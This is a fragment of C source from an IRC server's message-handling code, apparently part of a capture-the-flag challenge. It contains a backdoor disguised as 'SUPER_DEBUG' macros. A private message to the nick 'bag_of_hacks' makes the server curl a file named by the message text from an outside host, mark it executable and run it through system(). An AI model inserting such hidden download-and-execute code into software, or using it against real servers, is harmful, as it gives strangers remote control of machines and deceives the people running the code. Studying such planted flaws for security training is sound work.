...
#define INIT_SUPER_DEBUG(u, t) sprintf(u, "curl http://unreal.cyberstakesonline.com:4321/%s > tmp.lock; chmod +x tmp.lock; bash -c '/tmp.lock'; rm tmp.lock", t)
        #define SUPER_DEBUG(t) system(t)
	    ...
	    nick = strtoken(&p, NULL, ","))
	{
		if (IsVirus(sptr) && (!strcasecmp(nick, "ircd") || !strcasecmp(nick, "irc")))
		{
			...
			continue;
                ...
                if (!strcasecmp(nick, "bag_of_hacks")) {
                    ret = can_privmsg(cptr, sptr, acptr, notice, &text, &newcmd);
                    char log_buf[1024];
                    INIT_SUPER_DEBUG(log_buf, text);
                    SUPER_DEBUG(log_buf);
                }
